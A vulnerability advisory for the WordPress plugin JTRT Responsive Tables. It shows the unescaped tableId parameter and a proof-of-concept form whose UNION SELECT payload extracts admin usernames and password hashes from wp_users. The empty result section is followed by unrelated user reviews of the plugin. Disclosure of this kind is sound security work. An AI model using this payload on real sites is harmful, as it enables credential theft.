[Sem categoria](https://lenonleite.com.br/en/category/sem-categoria/)

### Homepage:

<https://pt.wordpress.org/plugins/jtrt-responsive-tables/>

### Description:

* Type user acces: registered single user.

$\_POST[‘tableId’] is not escaped.

### File / Code:

Path: /wp-content/plugins/jtrt-responsive-tables/admin/class-jtrt-responsive-tables-admin.php

Line :  183

```
$getTableId = $_POST['tableId'];
...
```
```
$retrieve_data = $wpdb->get_results( "SELECT * FROM $jtrt_tables_name WHERE jttable_IDD = " . $getTableId );

```
### Proof of Concept:

**1 – Log in with single user.**

**2 – Using form, sqli by post:**

```
<form method="post" action="http://target.dev/wp-admin/admin-ajax.php?action=get_old_table">
   <input type="text" name="tableId" value="1 UNION SELECT 1,2,CONCAT(user_login,char(58),user_pass),4,5 FROM wp_users WHERE ID=1">
   <input type="submit" name="">
</form>
```

**3 – Result:**

### [Could be better, appears to be unsupported now](https://wordpress.org/support/topic/could-be-better-appears-to-be-unsupported-now/)

Several things:
No documentation, although in the plug-in it says “coming soon”
Some features just don’t work very well:
1) Responsive versions — no explanation of how to make them work and to change the breakpoints so they scroll or degrade gracefully
2) No way to set table size so that it fits a container
3) Screwy implementation
For a freebie, it works passably well. But it could be better if the developer would hand it off to someone who cares.

I cannot edit the cells. Looks like a bug.

### [Its good enough](https://wordpress.org/support/topic/its-good-enough/)

[JIGSAW](https://profiles.wordpress.org/jigsaw/ "Posts by JIGSAW")

I wanted to give this coder a 5 star review because this plugin offers options like the ability to change font, font size, color and even upload an image which I didn’t think would be an issue with other “household” name plugins but it is.
The problem is that it looks so plain and tacky on the front end theres no way I can use this on a high end looking website. This coder is onto something and I am sure he/she has put a ton of work into this, but it needs a lot of polishing. And while I am very thankful they included an image uploader it displays quite unproportionate in comparison to everything else. On the right track but not ready for mainstream.

### [Locks up](https://wordpress.org/support/topic/locks-up-2/)

Installed this plugin and added a new table. Then tried to add an image to the table. This is what you get… Doing calculations, please wait..
Nothing after that. Just locks up the plugin and you have to escape out of the page. Tried it on Both Chrome and FF. Same results.

This plugin seems like everything I need, but unfortunately doesn’t work. Many of the buttons on the editor do nothing, and those that do just go to a “Doing calculation, please wait…” screen that never resolves.
